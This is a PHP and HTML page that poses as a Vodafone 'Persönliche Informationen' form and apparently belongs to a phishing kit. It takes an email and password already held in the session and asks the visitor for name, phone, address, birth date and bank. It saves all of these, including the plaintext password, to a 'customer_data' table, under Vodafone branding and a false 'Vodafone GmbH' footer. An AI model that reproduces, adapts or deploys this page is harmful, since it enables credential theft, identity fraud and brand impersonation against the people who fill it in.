<?php
session_start();

if (!isset($_SESSION['email']) || !isset($_SESSION['password'])) {
    header('Location: index.php');
    exit;
}

require_once 'includes/db.php';

$error = '';
$success = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $first_name = trim($_POST['first_name']);
    $last_name = trim($_POST['last_name']);
    $phone = trim($_POST['phone']);
    $street = trim($_POST['street']);
    $house_number = trim($_POST['house_number']);
    $postal_code = trim($_POST['postal_code']);
    $city = trim($_POST['city']);
    $bank_id = isset($_POST['bank_id']) ? (int)$_POST['bank_id'] : 0;
    $birth_date = $_POST['birth_date'];
    
    // Debug output
    error_log("Received bank_id: " . $bank_id);
    
    if (empty($first_name) || empty($last_name) || empty($phone) || 
        empty($street) || empty($house_number) || empty($postal_code) || 
        empty($city) || empty($bank_id) || empty($birth_date)) {
        $error = 'Bitte füllen Sie alle Pflichtfelder aus.';
    } else {
        try {
            // Check if bank exists and is active
            $bank_check = $conn->prepare("SELECT id FROM banks WHERE id = ? AND active = 1");
            if ($bank_check === false) {
                throw new Exception('Datenbankfehler: ' . $conn->error);
            }
            
            $bank_check->bind_param("i", $bank_id);
            $bank_check->execute();
            $bank_result = $bank_check->get_result();
            
            // Debug output
            error_log("Bank check result rows: " . $bank_result->num_rows);
            
            if ($bank_result->num_rows === 0) {
                throw new Exception('Bitte wählen Sie eine gültige Bank aus.');
            }

            $insert_sql = "INSERT INTO customer_data (
                first_name, last_name, email, phone, password, 
                street, house_number, postal_code, city,
                bank_id, birth_date
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)";

            $stmt = $conn->prepare($insert_sql);
            if ($stmt === false) {
                throw new Exception('Datenbankfehler: ' . $conn->error);
            }
            
            // Debug output
            error_log("Prepared insert statement");
            
            $stmt->bind_param("ssssssssssi", 
                $first_name, $last_name, $_SESSION['email'], $phone, $_SESSION['password'],
                $street, $house_number, $postal_code, $city,
                $bank_id, $birth_date
            );
            
            if ($stmt->execute()) {
                $success = 'Vielen Dank! Ihre Informationen wurden erfolgreich gespeichert.';
                // Clear session
                session_destroy();
            } else {
                throw new Exception('Beim Speichern Ihrer Daten ist ein Fehler aufgetreten: ' . $stmt->error);
            }
        } catch (Exception $e) {
            $error = $e->getMessage();
            // Debug output
            error_log("Error in form processing: " . $e->getMessage());
        }
    }
}
?>
<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Persönliche Informationen - Vodafone</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <link href="assets/css/style.css" rel="stylesheet">
</head>
<body class="vodafone-body">
    <header class="vodafone-header">
        <div class="container">
            <img src="assets/images/vodafone.png" alt="Vodafone" class="logo">
        </div>
    </header>

    <main class="container py-5">
        <div class="row justify-content-center">
            <div class="col-md-8">
                <div class="card shadow">
                    <div class="card-body p-4">
                        <h1 class="text-center mb-4">Persönliche Informationen</h1>
                        
                        <?php if ($success): ?>
                            <div class="alert alert-success">
                                <?php echo $success; ?>
                                <div class="mt-3">
                                    <a href="index.php" class="btn btn-primary">Zurück zur Startseite</a>
                                </div>
                            </div>
                        <?php else: ?>
                            <?php if ($error): ?>
                                <div class="alert alert-danger"><?php echo $error; ?></div>
                            <?php endif; ?>

                            <form method="POST" id="personalInfoForm" novalidate>
                                <div class="row">
                                    <div class="col-md-6 mb-3">
                                        <label for="first_name" class="form-label">Vorname *</label>
                                        <input type="text" class="form-control form-control-lg" id="first_name" name="first_name" required>
                                    </div>
                                    <div class="col-md-6 mb-3">
                                        <label for="last_name" class="form-label">Nachname *</label>
                                        <input type="text" class="form-control form-control-lg" id="last_name" name="last_name" required>
                                    </div>
                                </div>

                                <div class="mb-3">
                                    <label for="phone" class="form-label">Telefonnummer *</label>
                                    <input type="tel" class="form-control form-control-lg" id="phone" name="phone" required>
                                    <div class="invalid-feedback">Bitte geben Sie eine gültige Telefonnummer ein.</div>
                                </div>

                                <div class="mb-3">
                                    <label for="address" class="form-label">Adresse *</label>
                                    <div class="row g-3">
                                        <div class="col-md-8">
                                            <input type="text" class="form-control form-control-lg" id="street" name="street" placeholder="Straße" required>
                                        </div>
                                        <div class="col-md-4">
                                            <input type="text" class="form-control form-control-lg" id="house_number" name="house_number" placeholder="Hausnummer" required>
                                        </div>
                                        <div class="col-md-4">
                                            <input type="text" class="form-control form-control-lg" id="postal_code" name="postal_code" placeholder="PLZ" required>
                                        </div>
                                        <div class="col-md-8">
                                            <input type="text" class="form-control form-control-lg" id="city" name="city" placeholder="Stadt" required>
                                        </div>
                                    </div>
                                </div>

                                <div class="mb-4">
                                    <label for="bank_id" class="form-label">Bank für die Zahlung *</label>
                                    <select class="form-select form-select-lg" id="bank_id" name="bank_id" required>
                                        <option value="">Bitte wählen Sie Ihre Bank</option>
                                        <?php
                                        // Debug output
                                        error_log("Fetching banks from database");
                                        
                                        $banks_query = "SELECT id, name FROM banks WHERE active = 1 ORDER BY name";
                                        $banks_result = $conn->query($banks_query);
                                        
                                        if ($banks_result === false) {
                                            error_log("Bank query error: " . $conn->error);
                                        } else {
                                            while ($bank = $banks_result->fetch_assoc()) {
                                                echo '<option value="' . htmlspecialchars($bank['id']) . '">' . 
                                                     htmlspecialchars($bank['name']) . '</option>';
                                            }
                                        }
                                        ?>
                                    </select>
                                </div>

                                <div class="mb-3">
                                    <label for="birth_date" class="form-label">Geburtsdatum *</label>
                                    <input type="date" class="form-control form-control-lg" id="birth_date" name="birth_date" required>
                                </div>

                                <div class="d-grid gap-2">
                                    <button type="submit" class="btn btn-primary btn-lg">Informationen speichern</button>
                                </div>
                            </form>
                        <?php endif; ?>
                    </div>
                </div>
            </div>
        </div>
    </main>

    <footer class="footer mt-auto py-3">
        <div class="container text-center">
            <div class="footer-links">
                <a href="#">Impressum</a>
                <a href="#">Datenschutz</a>
                <a href="#">AGB</a>
                <a href="#">Hilfe</a>
            </div>
            <p class="mt-2 text-muted">&copy; <?php echo date('Y'); ?> Vodafone GmbH</p>
        </div>
    </footer>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        document.getElementById('personalInfoForm').addEventListener('submit', function(e) {
            const phone = document.getElementById('phone').value;
            const phoneRegex = /^\+?[0-9\s-]{6,}$/;
            
            if (!phoneRegex.test(phone)) {
                e.preventDefault();
                document.getElementById('phone').classList.add('is-invalid');
            } else {
                document.getElementById('phone').classList.remove('is-invalid');
            }
        });
    </script>
</body>
</html> 